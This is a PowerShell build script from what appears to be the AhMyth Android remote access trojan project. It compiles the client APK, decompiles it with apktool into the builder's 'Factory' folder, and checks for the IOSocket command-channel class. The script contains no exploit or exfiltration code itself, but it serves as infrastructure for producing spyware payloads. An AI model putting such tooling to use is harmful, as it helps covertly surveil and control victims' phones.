# Update Factory/Ahmyth from latest client source
# Run this script to sync the decompiled APK with the latest client code

param(
    [switch]$Force,
    [switch]$Debug,
    [ValidateSet('tcp','blockchain')][string]$ConnectionType = 'tcp',
    [string]$ClientPath
)

$ErrorActionPreference = "Stop"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
# Calculate client directory path (Factory is at AhMyth-Server/app/Factory, client is at AhMyth-Client)
# Go up 3 levels: Factory -> app -> AhMyth-Server -> root, then into AhMyth-Client
$parentDir = Split-Path -Parent $scriptDir  # app
$grandparentDir = Split-Path -Parent $parentDir  # AhMyth-Server
$rootDir = Split-Path -Parent $grandparentDir  # root

# Determine client directory based on connection type or explicit override
if (-not [string]::IsNullOrWhiteSpace($ClientPath)) {
    $clientDir = $ClientPath
} elseif ($ConnectionType -eq 'blockchain') {
    $clientDir = Join-Path $rootDir "AhMyth-Client-Blockchain"
} else {
    $clientDir = Join-Path $rootDir "AhMyth-Client"
}

# Resolve to absolute path to handle any relative path issues
try {
    $clientDir = [System.IO.Path]::GetFullPath($clientDir)
} catch {
    # If that fails, try Resolve-Path
    $resolved = Resolve-Path $clientDir -ErrorAction SilentlyContinue
    if ($resolved) {
        $clientDir = $resolved.Path
    }
}
$factoryDir = $scriptDir
$ahmythDir = Join-Path $factoryDir "Ahmyth"

Write-Host "=== AhMyth Factory Source Updater ===" -ForegroundColor Cyan
Write-Host "Connection type: $ConnectionType" -ForegroundColor Yellow
Write-Host "Using client source at $clientDir" -ForegroundColor Cyan

# Check if client directory exists
if (-not (Test-Path $clientDir)) {
    Write-Host "Error: Client directory not found at $clientDir" -ForegroundColor Red
    exit 1
}

# Build the client APK
Write-Host "`n[1/4] Building client APK..." -ForegroundColor Yellow
Push-Location $clientDir
try {
    if ($Debug) {
        $buildType = "assembleDebug"
        $apkPath = "app\build\outputs\apk\debug\app-debug.apk"
    } else {
        $buildType = "assembleRelease"
        $apkPath = "app\build\outputs\apk\release\app-release.apk"
    }
    
    $result = cmd /c ".\gradlew.bat $buildType --warning-mode=none 2>&1"
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Build failed!" -ForegroundColor Red
        Write-Host $result
        exit 1
    }
    Write-Host "Build successful!" -ForegroundColor Green
    
    $fullApkPath = Join-Path $clientDir $apkPath
    if (-not (Test-Path $fullApkPath)) {
        Write-Host "Error: APK not found at $fullApkPath" -ForegroundColor Red
        exit 1
    }
} finally {
    Pop-Location
}

# Decompile the APK
Write-Host "`n[2/4] Decompiling APK..." -ForegroundColor Yellow
Push-Location $factoryDir
try {
    $apktoolJar = Join-Path $factoryDir "apktool.jar"
    
    if (-not (Test-Path $apktoolJar)) {
        Write-Host "Error: apktool.jar not found" -ForegroundColor Red
        exit 1
    }
    
    # Remove old decompiled folder
    if (Test-Path $ahmythDir) {
        Write-Host "Removing old Ahmyth folder..."
        Remove-Item -Recurse -Force $ahmythDir
    }
    
    # Decompile
    $result = java -jar $apktoolJar d $fullApkPath -o Ahmyth -f 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "Decompilation failed!" -ForegroundColor Red
        Write-Host $result
        exit 1
    }
    Write-Host "Decompilation successful!" -ForegroundColor Green
} finally {
    Pop-Location
}

# Update Vault backup
Write-Host "`n[3/4] Updating Vault backup..." -ForegroundColor Yellow
$vaultDir = Join-Path $factoryDir "Vault"
if (-not (Test-Path $vaultDir)) {
    New-Item -ItemType Directory -Path $vaultDir | Out-Null
}
Copy-Item (Join-Path $ahmythDir "AndroidManifest.xml") (Join-Path $vaultDir "AndroidManifest.xml") -Force
Write-Host "Vault updated!" -ForegroundColor Green

# Verify
Write-Host "`n[4/4] Verifying..." -ForegroundColor Yellow
$smaliDir = Join-Path $ahmythDir "smali"
$manifestFile = Join-Path $ahmythDir "AndroidManifest.xml"

if ((Test-Path $smaliDir) -and (Test-Path $manifestFile)) {
    Write-Host "Factory source updated successfully!" -ForegroundColor Green
    
    # Verify IOSocket.smali exists
    $ioSocketPaths = @(
        (Join-Path $ahmythDir "smali_classes3\ahmyth\mine\king\ahmyth\IOSocket.smali"),
        (Join-Path $ahmythDir "smali\ahmyth\mine\king\ahmyth\IOSocket.smali"),
        (Join-Path $ahmythDir "smali_classes2\ahmyth\mine\king\ahmyth\IOSocket.smali")
    )
    
    $ioSocketFound = $false
    foreach ($ioPath in $ioSocketPaths) {
        if (Test-Path $ioPath) {
            Write-Host "✓ IOSocket.smali found at: $ioPath" -ForegroundColor Green
            $ioSocketFound = $true
            break
        }
    }
    
    # If not found in standard paths, search recursively
    if (-not $ioSocketFound) {
        Write-Host "⚠ IOSocket.smali not found in standard paths. Searching..." -ForegroundColor Yellow
        $ioSocketFile = Get-ChildItem -Path $ahmythDir -Recurse -Filter "IOSocket.smali" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($ioSocketFile) {
            Write-Host "✓ IOSocket.smali found at: $($ioSocketFile.FullName)" -ForegroundColor Green
            $ioSocketFound = $true
        } else {
            Write-Host "✗ IOSocket.smali not found after decompilation!" -ForegroundColor Red
            Write-Host "  This may indicate an issue with the APK build or decompilation." -ForegroundColor Yellow
        }
    }
    
    Write-Host "`nFactory structure:" -ForegroundColor Cyan
    Get-ChildItem $factoryDir | Where-Object { $_.PSIsContainer -or $_.Extension -eq ".jar" } | ForEach-Object {
        if ($_.PSIsContainer) {
            Write-Host "  [DIR] $($_.Name)" -ForegroundColor Blue
        } else {
            Write-Host "  [JAR] $($_.Name)" -ForegroundColor Magenta
        }
    }
} else {
    Write-Host "Error: Verification failed!" -ForegroundColor Red
    exit 1
}

Write-Host "`nDone! The Electron GUI builder will now use the latest client source." -ForegroundColor Green

# Explicitly exit with success code
exit 0
